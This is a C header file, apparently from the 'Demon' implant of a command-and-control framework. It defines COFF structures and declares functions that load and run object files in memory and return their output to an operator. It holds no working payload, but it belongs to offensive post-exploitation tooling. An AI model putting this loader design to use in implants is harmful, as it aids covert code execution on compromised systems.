//
// Created by spider on 18.03.21.
//

#ifndef DEMON_DOF_H
#define DEMON_DOF_H

#define SIZE_OF_PAGE 4096
#define PAGE_ALLIGN( x ) ( PVOID )( U_PTR( x ) + ( ( SIZE_OF_PAGE - ( U_PTR( x ) & ( SIZE_OF_PAGE - 1 ) ) ) % SIZE_OF_PAGE ) )

#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000
#define IMAGE_SCN_MEM_EXECUTE    0x20000000
#define IMAGE_SCN_MEM_READ       0x40000000
#define IMAGE_SCN_MEM_WRITE      0x80000000

// https://courses.cs.washington.edu/courses/cse378/03wi/lectures/LinkerFiles/coff.pdf
#define SYMBOL_IS_A_FUNCTION 0x20

typedef struct _COFFEE_PARAMS
{
    PCHAR  EntryName;
    DWORD  EntryNameSize;
    PVOID  CoffeeData;
    SIZE_T CoffeeDataSize;
    PVOID  ArgData;
    SIZE_T ArgSize;
    UINT32 RequestID;
} COFFEE_PARAMS, *PCOFFEE_PARAMS;

typedef struct _COFF_FILE_HEADER
{
    UINT16  Machine;
    UINT16  NumberOfSections;
    UINT32  TimeDateStamp;
    UINT32  PointerToSymbolTable;
    UINT32  NumberOfSymbols;
    UINT16  SizeOfOptionalHeader;
    UINT16  Characteristics;
} COFF_FILE_HEADER, *PCOFF_FILE_HEADER;

/* AMD64  should always be here */
#define MACHINETYPE_AMD64 0x8664

#pragma pack(push,1)

typedef struct _COFF_SECTION
{
    CHAR    Name[ 8 ];
    UINT32  VirtualSize;
    UINT32  VirtualAddress;
    UINT32  SizeOfRawData;
    UINT32  PointerToRawData;
    UINT32  PointerToRelocations;
    UINT32  PointerToLineNumbers;
    UINT16  NumberOfRelocations;
    UINT16  NumberOfLinenumbers;
    UINT32  Characteristics;
} COFF_SECTION, *PCOFF_SECTION;

typedef struct _COFF_RELOC
{
    UINT32  VirtualAddress;
    UINT32  SymbolTableIndex;
    UINT16  Type;
} COFF_RELOC, *PCOFF_RELOC;

typedef struct _COFF_SYMBOL
{
    union
    {
        CHAR    Name[ 8 ];
        UINT32  Value[ 2 ];
    } First;

    UINT32 Value;
    UINT16 SectionNumber;
    UINT16 Type;
    UINT8  StorageClass;
    UINT8  NumberOfAuxSymbols;
} COFF_SYMBOL, *PCOFF_SYMBOL;

typedef struct _SECTION_MAP
{
    PCHAR   Ptr;
    SIZE_T  Size;
} SECTION_MAP, *PSECTION_MAP;

typedef struct _COFFEE
{
    PVOID             Data;
    PCOFF_FILE_HEADER Header;
    PCOFF_SECTION     Section;
    PCOFF_RELOC       Reloc;
    PCOFF_SYMBOL      Symbol;
    PVOID             ImageBase;
    SIZE_T            BofSize;
    UINT32            RequestID;

    PSECTION_MAP      SecMap;
    PCHAR             FunMap;
    SIZE_T            FunMapSize;

    struct _COFFEE*   Next;
} COFFEE, *PCOFFEE;

/*!
 * CoffeeLdr
 * Simply executes an object file in the current thread (blocking)
 * @param EntryName
 * @param CoffeeData
 * @param ArgData
 * @param ArgSize
 * @param RequestID
 * @return
 */
VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID );

/*!
 * CoffeeRunner
 * Creates a separate thread for executing an object file with its own output buffer.
 * Send back the status and output of the object file output buffer
 * @param EntryName
 * @param CoffeeData
 * @param ArgData
 * @param ArgSize
 * @param RequestID
 * @return
 */
VOID  CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID );

#endif
